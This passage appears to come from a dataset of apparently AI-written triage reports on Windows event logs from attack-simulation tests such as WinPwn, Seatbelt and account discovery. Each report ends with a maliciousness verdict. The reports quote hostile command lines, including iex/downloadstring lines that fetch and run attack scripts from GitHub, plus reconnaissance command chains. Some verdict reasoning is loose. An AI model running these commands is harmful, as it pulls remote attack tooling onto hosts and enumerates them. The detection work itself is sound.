  - A successful NTLM authentication (`EventID 4624`) is noted for `admin_test` from `DESKTOP-3HL5B2P`. This should be investigated to ensure it's not an unauthorized access.

**3. Assessment and Recommendations:**

- **Suspicious Events:**
  - The use of `cmd.exe` with `net` commands to view administrative groups raises concerns about potential unauthorized privilege escalation attempts.
  - The combination of excessive privileges (`SeDebugPrivilege`, etc.) and the execution of enumeration commands is indicative of potentially malicious activity.

- **Recommendations:**
  - Validate the source of the NTLM logins to ensure they are from trusted machines.
  - Review recent administrative changes on the system and network.
  - Monitor for further suspicious behavior from the user `admin_test`.
  - Consider implementing additional logging to capture command output and network traffic for detailed analysis.
  - If not already in place, establish alerts for the execution of high-risk commands and unusual user behaviors.

### Conclusion:

**Resolution: SUSPICIOUS**
- The logs contain activity that is concerning and suggests potential unauthorized and possibly malicious actions which need further investigation to rule out or confirm malicious intent."
WinPwn - powerSQL,"### Summary of Analysis
The provided logs from the Windows host indicate a mix of normal and potentially malicious activity. Below is a detailed analysis of the various logs:

1. **Security Log Analysis:**
   - Multiple entries show standard system processes like `svchost.exe`, `wsmprovhost.exe`, and others with legitimate purposes.
   - Multiple logon type 5 (service logon) events for SYSTEM account indicate a background service activity. This is typically benign unless correlated with known malware behavior.
   - `EventID 4672` indicates that a privileged user (SYSTEM) received a group of previously granted special administrative privileges, which in normal operation would not be concerning unless excess privilege use is detected.
   - Repeated credential access failure (`EventID 5379`) with `ReturnCode 3221226021` (STATUS_NO_SUCH_LOGON_SESSION) suggests unsuccessful attempts to access certain resources without raising alerts, potentially indicative of unauthorized access attempts. However, these failures alone do not confirm malicious intent.

2. **Sysmon Log Analysis:**
   - Sysmon logs denote high-integrity level process executions under `SERVER002\\admin_test`. Commands like `whoami` and `hostname` executed with conhost.exe appear harmless unless linked with malicious scripts.
   - A notable event involves `powershell.exe` executing a script from a GitHub repository using `iex` (implicit execution). This PowerShell command downloads and executes a script named `WinPwn.ps1` from a suspicious source — potentially for malicious purposes such as privilege escalation or system information theft.
   - This PowerShell activity is a red flag as downloading and executing scripts from external repositories, especially named with suspicious mnemonics, often indicates malware or penetration testing tools executed by attackers.

3. **Application Log Analysis:**
   - Mostly benign entries showing service stop notifications.
   - The presence of Windows Defender events indicates it's active and providing security.
   - No explicit signs of application errors or malicious attempts traced through application logs directly.

4. **System Log Analysis:**
   - The kernel and system-time events denote usual activity. No anomalies present that directly suggest malicious activities here.
   - The use of legitimate system components continues throughout without irregular patterns.

5. **Windows PowerShell Log:**
   - Reaffirms that a PowerShell session executed with potentially harmful intent using a script from a public source. This execution pattern matches typical malicious use cases for exploiting system vulnerabilities or conducting system reconnaissance.

### Assessment
**MALICIOUS:** The evidence of downloading and executing a potentially harmful PowerShell script indicates unauthorized and potentially harmful activity on the system. While normal OS activities are present, the execution of external scripts without clear, benign justification is a strong indicator of compromise.

### Recommendations
- **Immediate Action:**
  - Conduct a full antivirus and anti-malware scan on the system to detect and remove any malicious payload that might have been deployed.
  - Isolate the affected host from the network to prevent further potential spread or data exfiltration.
  - Investigate the source and intent behind the `WinPwn.ps1` script to assess further threats or indicators of compromise.

- **Post-Incident Actions:**
  - Review and enhance PowerShell execution policies to prevent unauthorized script execution.
  - Implement stricter network and endpoint monitoring for detecting script-based attacks in real-time.
  - Conduct a security audit on user access and permissions to identify privilege misuse.
  - Educate users about the risks of executing unverified scripts and proper protocol for IT security awareness. 

By taking these actions, further malicious activities can be mitigated, and future incidents potentially prevented."
System Owner-User Discovery,"### Detailed Analysis of the Logs:

#### **Suspicious or Anomalous Behavior:**

1. **Security Log Events (Event ID 4798):** 
   - Several events involve the `admin_test` account, which is querying the security information (event ID 4798) of various user accounts including `Administrator`, `Guest`, `DefaultAccount`, and system accounts (`lplui`, `sshd`, `WDAGUtilityAccount`). 
   - The execution context of these events is linked to `WmiPrvSE.exe`, indicating possible unauthorized attempts to gather credential or account data via WMI (Windows Management Instrumentation). 
   - These actions, if not part of regular administrative monitoring, may suggest reconnaissance behavior typical of an internal attacker or malware attempting to enumerate user accounts and their respective privileges.

2. **Sysmon Log Events:**
   - **Command Execution Logs (Event ID 1 and 5):** Multiple command-line executions are recorded involving `cmd.exe` with complex command strings such as `whoami`, `wmic useraccount get /ALL`, and `qwinsta.exe`. These commands can be associated with gathering system and user information, a common tactic used by attackers to recon the system environment.
   - The execution sequence includes processes like `wevtutil.exe`, `conhost.exe`, and several command executions chained together. These commands all executing in rapid succession from the `admin_test` account should be scrutinized as they may indicate scripted behavior not typical of manual administrator activities.

3. **Command Line Details & Processes:**
   - There are compound command lines such as:
     ```
     ""cmd.exe"" /c cmd.exe /C whoami  & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & ...
     ```
   - The chaining of commands and use of tools like `wmic`, `quser`, `qwinsta` suggests automation, which could be consistent with script activity used in explorative attacks to gather as much information as possible about the system.

4. **Windows Update and Security Software:**
   - Logs indicate that regular updates are being applied, as seen in the application of a ""Security Intelligence Update for Microsoft Defender Antivirus"". This activity in itself isn't suspicious, however, it shows possibly overlapping legitimate activity amidst potentially malicious actions.

5. **Process Hierarchy:**
   - Notably, the use of `wsmprovhost.exe` as a parent process for several command executions (`HOSTNAME.EXE`, `whoami.exe`). This could imply the use of Windows Remote Management (WinRM) services, which are leveraged for remote command execution capabilities.

#### **Assessment:**

The collected evidence suggests potential malicious activity due to:
- Unusual enumeration of accounts using built-in system tools.
- Uncharacteristic and rapid execution of multiple system diagnostic commands.
- Use of the `admin_test` account, which may represent an abused or otherwise uncontrolled administrative account. The account's actions, if they are indeed unauthorized, could represent significant lateral movement within the network by a potential attacker.

### Resolution:

**Resolution: SUSPICIOUS**

The activities in the log are suspicious enough to warrant further investigation to determine the legitimacy of the `admin_test` account's actions. It is important to:
- Verify the intended and routine activities of the `admin_test` account with its owner or IT department.
- Conduct a thorough review of security controls around the account.
- Review and possibly reinforce account and network surveillance to confirm whether these actions could be part of an attack vector.

**Guidance on How to Proceed:**
- Analyze the source of the `admin_test` account actions. Determine if they are legitimate and expected.
- Review access logs to ensure the `admin_test` account hasn’t been compromised.
- Check for similar activities across other systems that might indicate coordinated network intrusion attempts.
- Confirm that no unauthorized systems or users were added to monitoring or admin tools and ensure all are up-to-date with the latest security patches and configurations."
WinPwn - GPORemoteAccessPolicy,"Based on the analysis of the provided logs, several indicators point towards malicious activity. Here is a detailed breakdown:

### Windows PowerShell Log
1. **Command Execution**: There is a PowerShell command that attempts to download and execute a script from a GitHub repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/...`). This pattern is commonly associated with malicious activity, where scripts are downloaded from the internet and executed locally.
2. **Use of `iex` (Invoke-Expression)**: The PowerShell command uses `iex(new-object net.webclient).downloadstring(...)`, which is a method to execute scripts fetched over the internet. This is a red flag for script-based attacks often used in PowerShell-based exploitation frameworks.

### Security Log
1. **Privilege Escalation**: An account named `admin_test` is seen with privileged accesses, specifically associated with `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and other high privileges which are typically associated with system-level access attempts.
2. **Anomalous Logons**: There are multiple logons in a short span of time with NTLM authentication, which might be an indicator of credential misuse or brute-force attempts.

### System Log
- The logs indicate several time change events near each other, which are not typical for standard operations. This might suggest attempts to tamper with log timestamps to obscure malicious activities.

### Sysmon Log
1. **Process Execution Events**: There are multiple processes launched in rapid succession, specifically `wevtutil.exe` and `conhost.exe`. `wevtutil.exe` is often used for event log manipulation, which can be a step in covering tracks.
2. **Execution of `PowerShell.EXE`**: The execution of PowerShell with a suspicious script path matches the activities logged under PowerShell events, further confirming malicious intent.

### Assessment
- **Suspicious PowerShell Activities**: The usage of PowerShell to download scripts from external sources and the execution of those scripts is a strong indicator of a potential compromise.
- **Privileged Account Usage**: The use of an administrative account (`admin_test`) with elevated privileges coinciding with the script execution times suggests an attempt to gain or utilize escalated privileges for malicious actions.
- **Time Manipulation**: The timezone and time adjustments around malicious events reflect attempts to obfuscate actions.

### Recommendation
Given the severity and nature of the findings, I recommend the following steps:
1. **Immediate Containment**: Isolate the affected machine, `Server002`, from the network to prevent further potential spread or data exfiltration.
2. **Investigation & Forensics**: Collect full memory dumps and preserve all current logs for further detailed examination by forensic experts.
3. **Change Credentials**: Reset credentials and review access for the account `admin_test` and any other affected accounts.
4. **Threat Detection**: Utilize threat intelligence to recognize if there are any known malicious indicators associated with the scripts' sources.
5. **Network Monitoring**: Enhance network monitoring for any signs of lateral movement or communication with known malicious IPs/domains.

### Conclusion
The activities observed in the logs suggest malicious activity beyond a reasonable doubt. The behaviors, including PowerShell misuse and privilege escalation, align with common attack vectors used in compromises.

**Resolution:** MALICIOUS"
Enumerate Active Directory Users with ADSISearcher,"Upon reviewing the provided Windows event logs from various sources, a few observations can be made:

1. **PowerShell Activity:**
   - The logs highlight PowerShell activity involving the execution of a command that utilizes `([adsisearcher]""objectcategory=user"").FindAll()` and `([adsisearcher]""objectcategory=user"").FindOne()`. While querying Active Directory for user objects is not inherently malicious, it can be a red flag if performed by unauthorized users or in unexpected contexts. However, without further context, this activity on its own is not definitively malicious.

2. **Process Execution:**
   - The Sysmon logs show that several `wevtutil.exe` and `conhost.exe` processes are initiated by the user `SERVER002\\admin_test`. The utility `wevtutil.exe` interacts with event logs, and it is suspicious if used unexpectedly, as attackers may use it to clear or export event logs. However, there is no additional information indicating these actions specifically took place, just the process execution.
   - Valid Microsoft Edge Update processes appear repeatedly in the logs, indicating routine updating activity for Microsoft Edge, consistent with legitimate software behavior.

3. **Security and System Logs:**
   - Time synchronization entries show slight modifications in system time, but these appear routine and are not indicative of tampering or malicious time changes.
   - Security logs show that there were no failed logins, unusual user logins, or privilege escalation attempts, which are good signs from a security standpoint.

4. **Application and System Logs:**
   - Actions such as the stopping of the `edgeupdate` service seem routine within the context of software updates and do not indicate malicious activity.

### Assessment:

- **Suspicious Activity:**  
  The PowerShell command querying Active Directory and the repeated `wevtutil.exe` usage by the `admin_test` account, although not immediately malicious, are suspicious and can be indicative of further investigation needed. This activity, combined with the execution under a user account involved in the administration, requires more scrutiny to ensure that it aligns with expected administrative tasks.

- **Potential Risks:**  
  If the PowerShell querying and `wevtutil.exe` usage are unauthorized or unexpected, there is a potential risk of reconnaissance and log manipulation, respectively, which can be part of the initial stages of a broader compromise.

### Guidance and Resolution:
- **Resolution: SUSPICIOUS**
  - Conduct a deeper investigation to verify whether the `admin_test` account's activity was authorized and within the scope of normal administrative actions.
  - Review user permissions for `admin_test` and check for any unusual access patterns or changes in Active Directory.
  - Confirm that the PowerShell script usage is part of an authorized script or administrative task.
  - Monitor for any follow-up activities that could further illuminate the intent behind these actions.
  
It is imperative to maintain a cautious approach due to the potential signs of reconnaissance or prep work for a compromise."
BIOS Information Discovery through Registry,"Upon reviewing the provided logs for potential malicious activity on the CEO's Windows machine, here is a detailed analysis:

### Application Log:
- **Security-SPP Event ID 16384:** Indicates normal behavior related to the Windows Software Protection Platform, not typically linked to malicious activities.
- **EdgeUpdate Service Stopped:** Regular maintenance or update logs for Microsoft Edge. Service stopping is part of normal operations after an update.

### Security Log:
- **Event ID 4616 (Security-Auditing):** Reflects a change in system time, which could be benign or potentially concerning if part of time manipulation by malware. In this context, appears triggered by legitimate services (svchost.exe).

### Sysmon Log:
- **Event ID 5:** Several instances of process creation events involving legitimate system utilities (e.g., `wevtutil.exe`, `conhost.exe`, `HOSTNAME.EXE`, `whoami.exe`, `cmd.exe`) initiated by the `admin_test` user. These utilities are often used for system administration tasks.
  
    - The logs capture normal activities like:
        - `hostname.exe` and `whoami.exe` usage, often seen in scripts or during interactive sessions.
        - The presence of `cmd.exe` executing registry queries could be linked to legitimate administrative tasks or software diagnostics/scripts.

- **Edge Update Activity:** A large number of logs related to `EdgeUpdate` processes indicate an update mechanism for Microsoft Edge. The use of Microsoft signed executables and expected directories suggests benign software-update activity.

### System Log:
- **Kernel-General and Time-Service Events:** Changes to system time recorded with details about the time source (`time.windows.com`). Time synchronization with an NTP server (Network Time Protocol) is standard for Windows systems.
   
### Overall Assessment:
- No explicit indicators of compromise (IoCs) like unauthorized software, abnormal command line arguments, or privilege escalation indicators have been identified. Most activities can be associated with routine system updates or legitimate administrative processes.

### Conclusion:
Given the observations:

- The behavior and logs analyzed appear consistent with typical system operations and do not indicate malicious activity. 

- **Resolution:** **BENIGN** - The logs contain benign activity. No immediate security incident is inferred from the reviewed logs. However, maintaining vigilance through continued monitoring and regular patch management is advised. 

For assurance, ensuring that the system maintains updated security patches and continues robustness in monitoring through EDR tools is advised to quickly identify any deviations from standard operational behavior in the future."
Packet Capture Windows Command Prompt,"Upon analysis of the provided Windows event logs, several activities stand out that warrant further investigation:

1. **PowerShell Execution**:
   - There is a PowerShell execution that involves downloading an executable file `wireshark_installer.exe` from the internet using `Invoke-WebRequest`, followed by its silent installation (`/S` switch). This execution was performed by `SERVER002\admin_test`.
   - PowerShell is often used by attackers due to its flexibility and capability to execute scripts which can be masked or obfuscated.

2. **Network Capture Execution**:
   - There is an instance where `cmd.exe` executes `c:\\Program Files\\Wireshark\\tshark.exe` with arguments indicating a capture of 5 packets on the network interface ""Ethernet"". This is notable because network packet capture can be used for both legitimate analysis and malicious network traffic inspection or data exfiltration.

3. **Installation of Software**:
   - Wireshark and its dependencies (Microsoft Visual C++ Redistributable) being installed silently could indicate an intentional setup for network analysis. The silent installation process and execution path from a `Temp` directory raise concerns.

4. **Unexpected Directories and File Execution**:
   - The use of directories like `C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\Externalfiles\\` for storing and executing the installer is uncommon for manual administrative tasks and could suggest an automated or stealth function, possibly indicative of malicious activity.

5. **Conhost and Whoami Execution**:
   - While several `conhost.exe` executions are observed, they are associated with legitimate parent processes like `cmd.exe`, which are routinely used in administrative tasks. However, the presence of `whoami.exe` indicates checking of user context, which can be part of a script's behavior for reconnaissance or privilege validation.

**Assessment**:
- The execution and installation of tools like Wireshark in stealth mode paired with network capturing indicate potentially suspicious behavior. The user's actions, specifically using PowerShell to download and install software silently, merit deeper inquiry to confirm justification for such actions.
  
**Threats/Risks Identified**:
- Possibility of insider threat or misuse of administrative privileges.
- Tools often used for initial access and lateral movements within networks.
- Potential data exfiltration through direct packet capture, which can be exploited to capture confidential information.

**Resolution**: **SUSPICIOUS**
- The activity observed in these logs doesn't outright confirm malicious intent but displays behavior that necessitates further investigation. 
- Recommend reaching out to the user `admin_test` for clarification of activity and verification of tasks executed for legitimate purposes.
- Conduct deeper anti-malware scans and check for unauthorized network connections.
- Review system and network policies to ensure actions taken by users align with organizational security policies.
- Consider temporary suspension of involved accounts or processes while investigation continues if deemed appropriate based on risk assessment."
WinPwn - PowerSharpPack - Seatbelt,"Upon reviewing the provided Windows event logs, a particular sequence of events draws attention:

1. **Windows PowerShell Log:**
   - There are multiple instances of PowerShell scripts executed via a command: `powershell.exe & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/PowerSharpPack/master/PowerSharpBinaries/Invoke-Seatbelt.ps1') \r\nInvoke-Seatbelt -Command \""-group=all\""}`.
   - The use of `Invoke-Expression` (`iex`) with `New-Object System.Net.WebClient` to download and execute a script from a GitHub repository is a significant indicator of suspicious activity. This technique is often used in attacks to download and execute malicious payloads.

2. **Sysmon Log:**
   - Multiple Sysmon events indicate the execution of `PowerShell.exe` through a similar suspicious command line that includes downloading and executing the `Invoke-Seatbelt.ps1` script. 
   - The presence of such activities suggests the execution of post-exploitation tools aimed at gathering information, which is commonly associated with malicious behavior.

3. **Potential Indicators of Malicious Activity:**
   - **Download and Execution of Scripts from External Sources:** The logs show download and execution of a script directly from an external source, which is often malicious.
   - **Use of PowerShell with Suspicious Commands:** The use of PowerShell with commands for remote script execution highlights possible malicious intentions.
   - **Other legitimate processes (svchost.exe, wevtutil.exe, conhost.exe, etc.) executing as expected:** These logs appear normal and expected within a Windows environment supporting typical system operations.

4. **Recommendations:**
   - **Immediate Containment:** Limit network access from the affected host to prevent further outbound connections.
   - **Script Block Logging and PowerShell Logging:** Ensure PowerShell script block logging and module logging are enabled to catch such events in the future.
   - **Investigate Network Activity:** Review network logs for unusual communications matching the timestamps of these PowerShell executions.
   - **Check for Persisted Threats:** Analyze for further artifacts or persistent threats that may have been left by the downloaded script or any secondary payloads.

Based on the evidence in the logs:

**Resolution:** **MALICIOUS**

The correlation of PowerShell activity that downloads and executes a script from an external source strongly indicates a compromise with malicious intent."
DNS Server Discovery Using nslookup,"**Detailed Analysis of the Logs:**

1. **Sysmon Logs**:
   - The Sysmon logs display a series of process creations involving typical tools: `whoami`, `conhost`, `wevtutil`, `hostname`, `cmd.exe`, `nslookup`, `MusNotification.exe`, and `wuauclt.exe`. These tools by themselves are not inherently malicious, but their context and usage pattern give clues to potential malicious actions.
   - Notably, `cmd.exe` is executing an `nslookup` command with arguments that include potentially sensitive DNS queries: `nslookup -querytype=ALL -timeout=12 _ldap._tcp.dc._msdcs.%%USERDNSDOMAIN%%`. This may indicate reconnaissance activity, trying to gather domain-related information. However, without additional context or evidence of data exfiltration or further exploitation, this is only suspicious, not clearly malicious.
   - The use of `wevtutil` and repeated execution of related processes (`conhost.exe` sessions) might indicate attempts to manipulate or gather event logs. However, there is no clear evidence of logs being cleared or tampered with, which would typically be a stronger indicator of malicious intent.
   - `MusNotification.exe`, `wuauclt.exe`, and `AM_Delta.exe` are associated with Windows updates and AntiMalware processes. Their appearance in the logs aligns with legitimate system activity to manage updates and malware signatures.

2. **System Logs**:
   - Events indicating ""Security Intelligence Update for Microsoft Defender Antivirus"" show legitimate system activity related to updates, which is not suspicious.

3. **Analysis of Process Execution and Command-line Arguments**:
   - The execution of common system utilities (`whoami`, `hostname`, etc.) under a high integrity context may raise an alert but does not, on its own, signify compromise without further evidence.
   - Frequent creation of `wevtutil` and `conhost` processes could indicate log querying or potential attempts at tampering. However, without evidence of deletion or modification, its significance remains speculative.
   - The `nslookup` usage in a potentially probing manner highlights a need for further investigation, as it could be part of a broader reconnaissance effort.

**Assessment of the Situation:**
- **Suspicious Activity**: The presence of certain command-line executions and `nslookup` activity suggests potential reconnaissance. The execution patterns of certain utilities may support that this host was under investigation by an internal or external user.

**Resolution**: **SUSPICIOUS**

**Guidance on How to Proceed:**
- Initiate a more in-depth investigation into the `admin_test` user's activities, especially around the time of these log events, to determine if the actions align with legitimate administrative tasks.
- Monitor network traffic to and from the host for signs of data exfiltration, particularly focusing on DNS queries and connections to anomalous domains.
- Review historical logs for any indications of further exploration or repeat occurrences of these tool usages.
- Enhance monitoring on `SERVER002` for any further suspicious patterns or potential escalation attempts.
- If available, correlate these activities against known threat intelligence to identify any similarities with known attack patterns."
Examine local password policy - Windows,"Upon analysis of the provided Windows event logs, the following points have been considered when evaluating for potential indicators of malicious activity:

1. **Service and Process Activity:**
   - Regular references and logs concerning the ""MicrosoftEdgeUpdate.exe"". It's typical for Windows machines with Microsoft Edge installed to have regular update checks, which are seen throughout the logs.
   - The use of processes such as `wevtutil.exe`, `conhost.exe`, `whoami.exe`, and `cmd.exe`: This can be normal activity, especially in administrative or scripting contexts. For example, `whoami.exe` is often used to check the current user's information, which can be a routine administrative task.
   - Several instances of the `net` and `net1` commands executed with ""accounts"" as the argument; these are used to display or set account policies which might suggest administrative activities but is not inherently malicious.

2. **Execution Context:**
   - Processes are mostly executed by `SERVER002\admin_test` or `NT AUTHORITY\SYSTEM`. This indicates actions performed with administrative privileges or as system user.
   - The presence of the Edge update and system maintenance activities under `NT AUTHORITY\SYSTEM` is consistent with routine system operations.
   
3. **Anomalous or Suspicious Activity:**
   - There is a concentration of command executions (`cmd.exe`, `net.exe`, `whoami.exe`) in a very short period, indicating a possible scripted or manual intervention. This could warrant deeper scrutiny, particularly on the command context and subsequent actions. However, no direct evidence connects this to malicious intentions (e.g., launching unknown executables, modifying system-critical settings, etc.).

4. **Edge-related activity:**
   - Numerous entries for Microsoft Edge Update services and executables (`edgeupdate`) show it stopping and starting frequently which is normal but might require confirmation if there's an issue with the Edge update service on `Server002`. 

5. **Recommendations:**
   - Further investigation into the rapid series of commands executed involving `cmd.exe` with ""net accounts"", typically benign but possibly indicative of an attempted review or change to account policies.
   - Verifying if the frequent stops/starts in Edge's update services are typical for the environment or indicative of a glitch/misconfiguration.

In conclusion, the evidence provided in the logs suggests routine system operations mixed with possibly automated administrative activities. However, there is some slightly unusual behavior concerning the use of administrative commands in close sequential timestamps, which should be further examined in the context of known IT operations or policy enforcement mechanisms active on `Server002`.

**Resolution: SUSPICIOUS -** The log activity shows some unusual patterns that need more investigation, particularly around the `cmd.exe` executions related to user accounts."
WinPwn - GPOAudit,"### Analysis of the Logs

**Suspicious Behavior Observed:**

1. **PowerShell Execution:**
   - A series of PowerShell events (EventID: 600) indicate the download and execution of a script from an external source:
     - Command: `powershell.exe & { … iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/.../WinPwn.ps1') GPOAudit -noninteractive -consoleoutput}`
   - This command is attempting to execute a PowerShell script directly from the internet using `iex` (Invoke-Expression), which is inherently risky and a common technique used in malicious activities. Scripts like ""WinPwn.ps1"" are often associated with penetration testing frameworks or malicious activities if used without explicit authorization.

2. **Sysmon Logs:**
   - Sysmon logs show various process creations with PowerShell (`powershell.exe`) being triggered to run the suspicious script.
   - The `wevtutil.exe` and `conhost.exe` processes are frequently executed by the user `SERVER002\admin_test`. Although `wevtutil.exe` is a legitimate Windows utility for event logs, frequent execution in conjunction can be an indicator of log clearing or tampering.
   - The processes appear to be run under a high integrity level, indicating high privileges which could lead to privilege escalation risks if these actions were unauthorized.

3. **Security and Kernel Logs:**
   - There aren’t significant indicators here; the logs mainly consist of regular time adjustments. However, it's crucial to ensure these were not altered to obscure activities.

4. **Application Logs:**
   - They generally indicate that Windows Defender is active (SECURITY_PRODUCT_STATE_ON), but this does not rule out the potential for sophisticated scripts to bypass or disable its protections temporarily during execution.

**Assessment:**

- The observed PowerShell activity of executing scripts directly from an untrusted external source demonstrates a significant threat indicator. Such activities suggest the potential for script-based malware attempts or unauthorized penetration testing exercises.
- The specific script being invoked is known in security communities for its use in auditing Group Policies, which can be benign if used by an authorized admin but malicious if executed by an attacker to gather sensitive configuration data.

**Resolution:**

- **MALICIOUS**: The execution of PowerShell commands that download and execute scripts from the internet without explicit authorization is a strong indication of a compromise attempt. This behavior aligns with techniques often used in initial stages of attacks, such as Reconnaissance and Execution.

**Recommendations:**

1. **Immediate Containment and Investigation:**
   - Isolate the host from the network to prevent potential lateral movement.
   - Verify the legitimacy of the `S3cur3Th1sSh1t_repo` PowerShell activity and ensure that it aligns with internal security protocols and authorized tests.

2. **Forensic Analysis:**
   - Conduct a detailed forensic analysis on the machine to determine the extent of the compromise.
   - Examine network logs for any unauthorized connections or data exfiltration attempts.

3. **Ensure Security Updates:**
   - Verify that all security updates and patches are applied to prevent exploitation of known vulnerabilities.

4. **User Education and Policy Enforcement:**
   - Educate employees on the risks of executing scripts from untrusted sources.
   - Implement strict policies to monitor, review, and approve the execution of scripts on critical systems.

5. **Logging and Monitoring:**
   - Enhance PowerShell logging to include full command-line arguments for any PowerShell script execution.
   - Utilize advanced threat protection tools to detect and block such script-based techniques in the future."
WinPwn - DotNet,"**Detailed Analysis of the Logs:**

Upon reviewing the provided event logs, several pieces of potentially suspicious activity were identified that warrant closer examination.

### Suspicious or Anomalous Behavior:

1. **PowerShell Activity:**
   - The PowerShell logs show a particular command execution that downloads and executes a script from the internet using `iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')`. This behavior is highly suspicious as it suggests potential execution of an externally hosted, possibly malicious script. Scripts run from such sources can often indicate an attempt to execute unauthorized or harmful code.

2. **Privilege Escalation:**
   - A Security log event (ID 4672) indicates that the user `admin_test` was granted a wide range of privileges, including `SeDebugPrivilege`, which can be used to attach a debugger to any process. This action is unusual and could suggest privilege escalation, which is often associated with malicious activities attempting to gain elevated access.

3. **Process Execution:**
   - The Sysmon log shows the execution of the `wevtutil.exe` utility multiple times. This tool is often used for managing and querying event logs, and its repeated usage could suggest tampering or clearing of logs to cover tracks after malicious activity.

4. **Time Manipulation:**
   - The Security log event ID 4616 showed an unexpected change in the system time (`PreviousTime` was later than `NewTime`). Manipulating system time is often a tactic used to disrupt logging and evade detection.

### Malicious Indicators:

- The downloading and execution of PowerShell script from an internet repository `S3cur3Th1sSh1t` clearly indicates potentially malicious behavior. The repository name itself is suspicious, suggesting it might be related to penetration testing or hacking activities.
- Granting of advanced privileges to `admin_test` without apparent reason indicates a potential compromised account that is being used to escalate privileges on the system.

**Assessment and Conclusion:**

Based on the logs, there are clear indicators of potential compromise:

- Unauthorized script execution via PowerShell.
- Self-elevation of privileges on an administrative account.
- Possible log manipulation using `wevtutil.exe`.
- System time alteration which can obstruct forensic investigation by altering timestamps in logs.

**Resolution: MALICIOUS**

**Guidance on How to Proceed:**

1. **Immediate Isolation:**
   - Isolate the affected host (SERVER002) from the network to prevent further spread of any malicious activities.

2. **Detailed Forensic Investigation:**
   - Investigate the PowerShell scripts mentioned in the logs, particularly the script `WinPwn.ps1` from the potentially malicious repository.
   - Review the activity of the `admin_test` account, including recent logons and any changes made to account privileges.

3. **Log Review:**
   - Perform a comprehensive review of the logs to determine any other unusual patterns or entries surrounding the times of the logged events.
   - Review historical logs to correlate with activities from the current findings.

4. **Security Enhancements:**
   - Ensure that PowerShell logging is sufficiently detailed, including script block logging and module logging.
   - Implement stricter privilege management and ensure that accounts have only the minimum necessary privileges.
   - Review and enhance detection capabilities around unusual system time changes and the use of utilities like `wevtutil.exe`.

5. **Incident Report and Recovery:**
   - Prepare a detailed incident report, including steps taken and outcomes.
   - Restore the system from clean backups if necessary and monitor the network for any signs of persistence or further compromise.

Following these steps will help secure the environment, mitigate further risks, and ensure a detailed understanding of the breach's impact."
Process Discovery - get-wmiObject,"Upon analyzing the provided Windows event logs, several points of interest are noted:

1. **Time Change Events:**  
   - The System log indicates changes in the system time multiple times within a very short period. This is often indicative of tampering or attempts to cover tracks by manipulating the timestamp of various activities. The process responsible for this activity (`svchost.exe`) is commonly used for running Windows services, which can be benign. However, it can be targeted for privilege escalation if misused.

2. **Privilege Assignment and Logon Events:**
   - The Security logs show events (Event ID: 4672) where the user `admin_test` is assigned a set of high privileges including `SeDebugPrivilege` and others that allow significant system control. This is paired with logon events (Event ID: 4624) using NTLM authentication from an external workstation with a specific IP address `fe80::...`, suggesting remote access.
   - These types of privileges are normal for administrators but could be suspicious if `admin_test` is not authorized or expected to perform these actions during that time, especially when matched with time changes.

3. **Process Execution and Sysmon Events:**
   - A considerable number of Sysmon logs relate to the use of `wevtutil.exe` and `conhost.exe` by the `admin_test` user. `wevtutil.exe` is typically used for managing event logs and could be indicative of log clearing or exporting, especially when done repeatedly or in an automated manner.
   - The execution of PowerShell with the command `get-wmiObject -class Win32_Process` is logged under Sysmon with the `admin_test` user. This can be used to query system processes and is sometimes utilized in reconnaissance or preparation for lateral movement.

4. **PowerShell Logs:**
   - The PowerShell logs confirm the use of PowerShell to execute system queries via the WMI class, as well as several activities that align with setting up the environment for PowerShell use. This can be benign if part of routine admin activities but, in conjunction with other suspicious activity, could heighten concerns.

**Assessment and Resolution:**

- While many of these activities can be justified as administrative actions (e.g., log querying, PowerShell usage), the fact that these align with time adjustments and repetitive privilege assignments without obvious legitimate context raises concerns. 
- These logs indicate behavior that could be either regular administrative tasks or preparation for malicious actions such as privilege escalation, system reconnaissance, or anti-forensics.

Given the evidence, it is recommended to proceed with caution. The presence of time manipulation in particular demands further investigation, as this is often considered a hallmark of malicious activity despite lacking direct evidence of compromise in this isolated log review.

**Final Resolution: SUSPICIOUS**

**Guidance:**
1. Review the access controls for `admin_test`, ensuring this account's activities align with its expected roles.
2. Check for any remote connection policies and verify if the said IP address should have access.
3. Conduct a thorough analysis of recent changes or anomalies in file integrity and system configurations.
4. Engage in network traffic analysis to identify any unexpected patterns or connections, possibly correlating with the times of these events.
5. Increase monitoring and consider imposing stricter controls on systems exhibiting similar suspicious behaviors."
System Network Connections Discovery,"Upon review of the provided Windows event logs, the following observations are made regarding potential malicious activity:

1. **Process Creation Events (Sysmon Event ID 1):**
   - Several legitimate system utilities, such as `whoami.exe`, `conhost.exe`, `wevtutil.exe`, `hostname.exe`, and `cmd.exe` were executed frequently and close in succession by the user `SERVER002\admin_test`. 
   - The execution of `cmd.exe` with command line parameters `""cmd.exe"" /c netstat & net use & net sessions` is typically seen during reconnaissance activities, as these commands are often used to gather network connection details and active session information.
   - The use of `wevtutil.exe` is notable because although this utility is benign, it can be used by attackers to clear or export event logs, potentially to cover tracks.

2. **Privileges and Logon Events (Security Log):**
   - An account named `admin_test` is seen with multiple logon instances occurring within a short time frame using NTLM authentication. 
   - Event ID 4672 indicates that this user account was granted special privileges such as `SeDebugPrivilege`, `SeBackupPrivilege`, `SeRestorePrivilege`, etc., which can be considered as a risk if the account had these privileges escalated unexpectedly.

3. **Application and System Events:**
   - No critical or error-level entries specific to this timeframe were observed in the application log that would directly indicate exploitation or a breach.
   - The activities align with that of a system administrator checking configurations or a potential intruder exploring the network environment.

**Assessment:**
- The burst of command line executions and use of system utilities like `cmd.exe`, `wevtutil.exe`, and probing commands such as `netstat` and `net use` can indicate a reconnaissance attempt or a script running for system inventory purposes. 
- The use of NTLM authentication may not be inherently suspicious, but it does raise a cautionary note if this pattern is not normal for the identified account (`admin_test`).
- The presence of high integrity level processes and the high privilege capabilities of `admin_test` are concerning if not part of regular user permissions.

**Resolution:**
